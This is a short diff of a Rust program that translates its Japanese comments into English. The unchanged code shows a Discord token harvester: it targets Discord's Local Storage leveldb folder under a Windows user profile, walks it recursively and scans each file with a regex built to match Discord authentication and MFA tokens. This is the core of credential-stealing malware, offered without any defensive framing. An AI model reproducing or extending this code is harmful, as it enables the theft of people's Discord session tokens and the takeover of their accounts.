@@ -6,13 +6,13 @@ use regex::Regex;
 fn main() {
     let target_dir = format!(r"C:\Users\ema\AppData\Roaming\discord\Local Storage\leveldb");
 
-    // トークンパターン
+    // Token pattern
     let token_regex = Regex::new(r"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,})").unwrap();
 
     visit_dirs(Path::new(&target_dir), &token_regex);
 }
 
-// ディレクトリ再帰処理
+// Recursively traverse directories
 fn visit_dirs(dir: &Path, token_regex: &Regex) {
     if let Ok(entries) = fs::read_dir(dir) {
         for entry in entries.flatten() {
@@ -28,7 +28,7 @@ fn visit_dirs(dir: &Path, token_regex: &Regex) {
     }
 }
 
-// ファイルから1行ずつトークン抽出
+// Extract tokens line by line from the file
 fn scan_file(path: &Path, token_regex: &Regex) {
     if let Ok(file) = File::open(path) {
         let reader = BufReader::new(file);
